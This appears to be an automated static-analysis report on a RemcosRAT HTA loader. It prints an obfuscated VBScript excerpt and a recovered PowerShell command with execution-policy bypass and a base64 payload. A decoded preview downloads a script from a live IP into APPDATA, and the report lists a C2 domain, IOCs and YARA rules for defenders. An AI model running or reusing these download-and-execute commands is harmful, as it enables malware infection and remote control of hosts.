# Storytime: Dissecting a RemcosRAT HTA loader

> **Source:** [MalwareBazaar](https://bazaar.abuse.ch/sample/2b48b4d74ec2b1cfbd9e732c2b4d1c58c82882007ab5624c74b15657feb9641d/) · **SHA-256** `2b48b4d74ec2b1cfbd9e732c2b4d1c58c82882007ab5624c74b15657feb9641d` · **Family** `RemcosRAT` · **Static analysis only — the sample was never run.**

## The Story

It showed up on MalwareBazaar as a 48509-byte `hta` file, tagged `RemcosRAT`. We pulled exactly one copy into quarantine, cracked open the password-protected archive, and read the bytes as inert text. Nothing here was executed — every claim below comes from reading the code, not running it. Here is what it was hiding.

## First Contact — The Code As It Arrived

Straight out of the archive, a portion of the sample looks like this (defanged):

```hta
<!DOCTYPE html>
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" >
<html>
<body>
<scriPT lAnguaGE="vbscRIpT">
																																																																																																																																																																																																																																																									fUNCtiON																																																																																																																																																																																																																																																									MZlARFOPvVaTVsdMDffiWjAoQeuenznuTqYWzXVQUNBeaUWIgoWzAUjTmlIisiuJbTsMniLiJXoTIdjMBkSRolkIqLfYDKfzRHojqODFwBizZukMwSMyuMYxIGHMdJOFZKGDPqTVPzdnjuuwzqBJcWVZXWjPZFSQgdqjUqbUwVWwuHjFsE																																																																																																																																																																																																																																																									(																																																																																																																																																																																																																																																									bYVAL																																																																																																																																																																																																
... (truncated)
```

## Peeling Back the Obfuscation

That wall of noise is deliberate. The sample assembles its real payload one fragment at a time and laces every fragment with a junk token, so a casual look (or a naive string scan) sees gibberish. Undo that concatenation and strip the junk token — purely as text, nothing runs — and the mask drops:

```text
POWeRSHeLl -Ex BYPASs -noP -W 1 -Ec IAAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAHcAZwBFAFQAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAB0gaAB0AHQAcAA6AC8ALwA0ADYALgAxADgAMwAuADIAMgAzAC4ANwAvADkAMAAvAHcAZQBnAGkAdgBpAG4AZwBiAGUAcwB0AHMAbwBsAHUAdABpAG8AbgBzAGYAbwByAGIAZQB0AHQAZQByAHAAbABhAGMAZQBzAC4AagBzAB0gIAAgACAAIAAgACAAIAAgACAALQBvAFUAVABmAEkAbABlACAAHSAkAEUAbgB2ADoAQQBQAFAAZABBAHQAQQBcAGcAaQB2AGUAdwBlAGcAaQB2AGkAbgBnAGIAZQBzAHQAcwBvAGwAdQB0AGkAbwBuAHMAZgBvAHIAYgBlAHQAdABlAHIAcABsAGEAYwBlAHMALgBqAHMAHSAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAOwAgAAkAIAAJACAAIAAJACAACQAJAAkAIAAgAAkAIAAJACAACQAgAAkACQAmACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAHSAkAEUATgB2ADoAQQBQAHAARABBAFQAYQBcAGcAaQB2AGUA
// ... truncated ...
```

Now the intent is legible. It hands a command to the system instead of doing the work in plain sight.

## Following the Chain

Each wrapper peels back to another (decoded as bytes, never executed):

- **Layer 1** (utf-16le) — reaching out to hxxp://46[.]183[.]223[.]7/90/wegivingbestsolutionsforbetterplaces[.]js”, 46[.]183[.]223[.]7, givewegivingbestsolutionsforbetterplaces[.]js, wegivingbestsolutionsforbetterplaces[.]js. Preview: `wgET ”http://46.183.223.7/90/wegivingbestsolutionsforbetterplaces.js” -oUTfIle ”$Env:APPdAtA\givewegivingbe...`

## What It Wants To Do

The behaviour that matters, recovered from the (deobfuscated) code: `obfuscation`, `shell_execution`. It shells out to the OS to run external commands.

## Technical Architecture & System Impact

How the pieces fit together and what each stage would do to a host that ran it (reconstructed from static evidence — nothing here was executed):

### Execution chain

- **Stage 0 — delivery:** the `hta` loader analyzed here lands on the host and runs.
- **Stage 1 — deobfuscation & hand-off:** it rebuilds a hidden command from fragmented/encoded strings and hands it to the system shell or interpreter.
- **Stage 2 — decoded utf-16le payload:** reaching hxxp://46[.]183[.]223[.]7/90/wegivingbestsolutionsforbetterplaces[.]js”, 46[.]183[.]223[.]7, givewegivingbestsolutionsforbetterplaces[.]js, wegivingbestsolutionsforbetterplaces[.]js.
- **Stage 3 — command & control:** the `RemcosRAT` payload beacons to kelvin654[.]duckdns[.]org, 46[.]183[.]223[.]7 for tasking.

### System surfaces touched

| Surface | Effect on the host |
|---|---|
| Obfuscation | Hides its real payload behind encoding/packing to defeat casual inspection. |
| Process execution | Spawns OS child processes / shells to run external commands. |
| Network egress | Contacts the remote indicators listed above. |

**Blast radius:** a host that ran this would, by design, establishes outbound C2. Treat any host with these indicators as compromised pending response.

## Executive Summary

One MalwareBazaar submission, analyzed statically — never executed, loaded, imported, or dynamically tested. Static evidence produced 4 IOCs and 6 code/string findings, recovered 4 network indicator(s) by decoding the sample's own obfuscated/base64 payload layers, plus 2 metadata-derived network indicator(s) listed separately below.

## What The Agent Did

1. Pulled recent MalwareBazaar metadata.
2. Selected one unprocessed or source-preferred candidate.
3. Downloaded only that sample's password-protected ZIP into quarantine.
4. Read one archived member into memory for static analysis.
5. Calculated hashes, entropy, file magic, printable strings, IOCs, and suspicious code/string patterns.
6. Generated this technical blog, structured JSON, IOC JSON, YARA, and a verifier prompt.

## Sample Identity

| Field | Value |
|---|---|
| MalwareBazaar SHA-256 | `2b48b4d74ec2b1cfbd9e732c2b4d1c58c82882007ab5624c74b15657feb9641d` |
| Analyzed SHA-256 | `2b48b4d74ec2b1cfbd9e732c2b4d1c58c82882007ab5624c74b15657feb9641d` |
| Family label | `RemcosRAT` |
| File name | `sweetnessgivenmebestthingsforever.hta` |
| Archived member | `2b48b4d74ec2b1cfbd9e732c2b4d1c58c82882007ab5624c74b15657feb9641d.hta` |
| File type | `hta` |
| First seen | `2026-06-21 09:41:27` |
| Tags | `46-183-223-7, hta, kelvin654-duckdns-org, RemcosRAT, spam-ita` |

## Static Triage

| Property | Value |
|---|---:|
| Bytes analyzed | 48509 |
| Entropy | 1.711 |
| Printable strings | 69 |
| File magic | `3c 21 44 4f 43 54 59 50` |

## IOCs

| Type | Value |
|---|---|
| MD5 | `645b21ae90237079c4ff8d1c93442071` |
| SHA-1 | `82569fcb91410f416ce12b966b91519d5ea89608` |
| SHA-256 | `2b48b4d74ec2b1cfbd9e732c2b4d1c58c82882007ab5624c74b15657feb9641d` |
| Domain | `adodB.STReam` |

## Metadata-Derived Network Indicators

These indicators come from MalwareBazaar submission tags, not from bytes observed in this sample. The payload is obfuscated, so its real C2 is not visible to static text extraction. Domain values are reconstructed from dash-encoded tags and should be verified before blocking.

| Type | Value | Source tag |
|---|---|---|
| IP | `46.183.223.7` | metadata |
| Domain | `kelvin654.duckdns.org` | metadata |

## Code Dissection

### Deobfuscation

The sample assembles a payload through string concatenation and then strips a junk token to reveal it. Reconstructing that string statically (no execution) recovers the launched command:

```text
POWeRSHeLl -Ex BYPASs -noP -W 1 -Ec IAAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAAkACQAJAHcAZwBFAFQAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAB0gaAB0AHQAcAA6AC8ALwA0ADYALgAxADgAMwAuADIAMgAzAC4ANwAvADkAMAAvAHcAZQBnAGkAdgBpAG4AZwBiAGUAcwB0AHMAbwBsAHUAdABpAG8AbgBzAGYAbwByAGIAZQB0AHQAZQByAHAAbABhAGMAZQBzAC4AagBzAB0gIAAgACAAIAAgACAAIAAgACAALQBvAFUAVABmAEkAbABlACAAHSAkAEUAbgB2ADoAQQBQAFAAZABBAHQAQQBcAGcAaQB2AGUAdwBlAGcAaQB2AGkAbgBnAGIAZQBzAHQAcwBvAGwAdQB0AGkAbwBuAHMAZgBvAHIAYgBlAHQAdABlAHIAcABsAGEAYwBlAHMALgBqAHMAHSAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAOwAgAAkAIAAJACAAIAAJACAACQAJAAkAIAAgAAkAI...
```

### Decoded Payload Layers

Each base64 layer was decoded as inert bytes (not executed). Network indicators recovered here come from the sample's own code, not from MalwareBazaar metadata.

| Layer | Encoding | Recovered indicators | Preview |
|---|---|---|---|
| 1 | utf-16le | hxxp://46[.]183[.]223[.]7/90/wegivingbestsolutionsforbetterplaces[.]js”, 46[.]183[.]223[.]7, givewegivingbestsolutionsforbetterplaces[.]js, wegivingbestsolutionsforbetterplaces[.]js | `wgET ”http://46.183.223.7/90/wegivingbestsolutionsforbetterplaces.js” -oUTfIle ”$Env:APPdAtA\givewegivingbestsolution...` |

### Top-Level Execution Behaviour

Behaviour detected across the sample (including recovered/deobfuscated code): `obfuscation`, `shell_execution`.


## Static Findings

| Severity | Category | Evidence | Detail |
|---|---|---|---|
| high | shell_execution | `powershell(?:\.exe)?` | Matched 2 occurrence(s) |
| high | obfuscation | `concat_replace_deobfuscation` | Recovered 1 concatenated/obfuscated payload string(s) |
| medium | obfuscation | `base64_blob` | Found 42 long base64-like blob(s) |
| info | decoded_hint | `1@DSVVL Z0(A랟9N uPP^iE HӚR"+m; "%z ! DY Dz# f #21 atd>?7gΠIqeY]hdT` | Preview from base64-like blob; not executed |
| info | decoded_hint | `36Ft ܤFP ]7c)清[,M uٴB 5 dX V6Zd v K | w3A$5i,*hf }r +ohJz !` | Preview from base64-like blob; not executed |
| info | decoded_hint | `E 1'8V z2 \bvX &"_1 '89 A93s] <E;p 3+T#J%@Ę<[M>9m CΔd`S jV%yF nU L` | Preview from base64-like blob; not executed |

## Selected Strings

These strings were selected because they contain network indicators or suspicious execution markers.

| String |
|---|
| `"adodB.STReam"` |
| `"POWeRSHeLl` |

## What We've Learned So Far

How this sample sits against everything the loop has analyzed before:

- Corpus before this sample: **2** prior sample(s).
- The `RemcosRAT` family has been seen **1** time(s) before.
- Recurring techniques across the corpus: `decoded_hint` (×1), `obfuscation` (×1), `shell_execution` (×1).


## YARA Rules

The first rule combines an exact SHA-256 condition with selected static strings. The second rule is generated from static source/string findings.

```yara
import "hash"

rule Single_Sample_Static_2b48b4d74ec2b1cf
{
  meta:
    source = "loop-engineering single-sample static analysis"
    analysis = "static only; sample not executed"
    sha256 = "2b48b4d74ec2b1cfbd9e732c2b4d1c58c82882007ab5624c74b15657feb9641d"
    md5 = "645b21ae90237079c4ff8d1c93442071"
    sha1 = "82569fcb91410f416ce12b966b91519d5ea89608"
    file_magic = "3c 21 44 4f 43 54 59 50"
    malwarebazaar_family = "RemcosRAT"
  strings:
    $s01 = "\"adodB.STReam\"" nocase
    $s02 = "\"POWeRSHeLl" nocase
  condition:
    hash.sha256(0, filesize) == "2b48b4d74ec2b1cfbd9e732c2b4d1c58c82882007ab5624c74b15657feb9641d" or 2 of ($s*)
}

rule Static_Source_Malware_Indicators
{
  meta:
    source = "loop-engineering static source analysis"
    language_hint = "hta"
    analysis = "static text only; sample not executed"
  strings:
    $domain_01 = "adodB.STReam" nocase
    $shell_execution_02 = /powershell(?:\.exe)?/ nocase
  condition:
    any of them
}


rule Single_Sample_Metadata_Network_2b48b4d74ec2b1cf
{
  meta:
    source = "loop-engineering single-sample analysis (MalwareBazaar metadata)"
    analysis = "network indicators from submission tags; not statically observed"
    sha256 = "2b48b4d74ec2b1cfbd9e732c2b4d1c58c82882007ab5624c74b15657feb9641d"
  strings:
    $n01 = "46.183.223.7" nocase
    $n02 = "kelvin654.duckdns.org" nocase
  condition:
    any of them
}


rule Single_Sample_Decoded_Payload_2b48b4d74ec2b1cf
{
  meta:
    source = "loop-engineering single-sample analysis (decoded payload layers)"
    analysis = "indicators recovered by statically decoding embedded base64; not executed"
    sha256 = "2b48b4d74ec2b1cfbd9e732c2b4d1c58c82882007ab5624c74b15657feb9641d"
  strings:
    $d01 = "http://46.183.223.7/90/wegivingbestsolutionsforbetterplaces.js”" nocase
    $d02 = "46.183.223.7" nocase
    $d03 = "givewegivingbestsolutionsforbetterplaces.js" nocase
    $d04 = "wegivingbestsolutionsforbetterplaces.js" nocase
  condition:
    any of them
}
```

## Analyst Assessment

MalwareBazaar labels this sample as `RemcosRAT`, so triage should start with that family context. Static strings expose network indicators that can support enrichment and hunting. High-severity static patterns were found, especially execution or script-loading indicators.

## Verification Notes

- A second agent should verify that the blog claims are supported by `analysis.json` and `sample.yar`.
- No dynamic behavior should be asserted unless a future static source analysis produces supporting evidence.
- The raw sample ZIP remains in `quarantine/` and must not be committed.
